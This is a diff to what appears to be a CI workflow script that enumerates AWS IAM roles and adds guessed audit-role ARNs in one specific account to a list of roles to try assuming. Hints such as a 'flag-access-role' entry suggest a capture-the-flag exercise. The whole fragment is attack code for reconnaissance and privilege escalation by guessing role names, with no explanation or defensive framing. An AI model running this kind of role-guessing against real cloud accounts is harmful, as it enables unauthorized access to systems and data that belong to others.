@@ -137,8 +137,16 @@ jobs:
         echo "=== Searching for IAM roles ==="
         aws iam list-roles --query 'Roles[?contains(RoleName, `privilege`) || contains(RoleName, `admin`) || contains(RoleName, `elevated`) || contains(RoleName, `secret`)].[RoleName,Arn]' --output table || echo "Cannot list roles"
         
-        # Common role naming patterns that might require external_id
+        # Based on gist hint: "IAM Role for Audit Access" - prioritize audit roles
         POTENTIAL_ROLES=(
+          "arn:aws:iam::170974506515:role/audit-access-role"
+          "arn:aws:iam::170974506515:role/audit-role"
+          "arn:aws:iam::170974506515:role/internal-audit-role"
+          "arn:aws:iam::170974506515:role/hexnova-audit-role"
+          "arn:aws:iam::170974506515:role/hexnova404-audit-role"
+          "arn:aws:iam::170974506515:role/auditor-role"
+          "arn:aws:iam::170974506515:role/security-audit-role"
+          "arn:aws:iam::170974506515:role/internal-auditor-role"
           "arn:aws:iam::170974506515:role/privileged-access-role"
           "arn:aws:iam::170974506515:role/admin-role"
           "arn:aws:iam::170974506515:role/elevated-access-role"
@@ -153,7 +161,6 @@ jobs:
           "arn:aws:iam::170974506515:role/production-role"
           "arn:aws:iam::170974506515:role/deployment-role"
           "arn:aws:iam::170974506515:role/security-role"
-          "arn:aws:iam::170974506515:role/audit-role"
           "arn:aws:iam::170974506515:role/backup-role"
           "arn:aws:iam::170974506515:role/data-access-role"
           "arn:aws:iam::170974506515:role/flag-access-role"
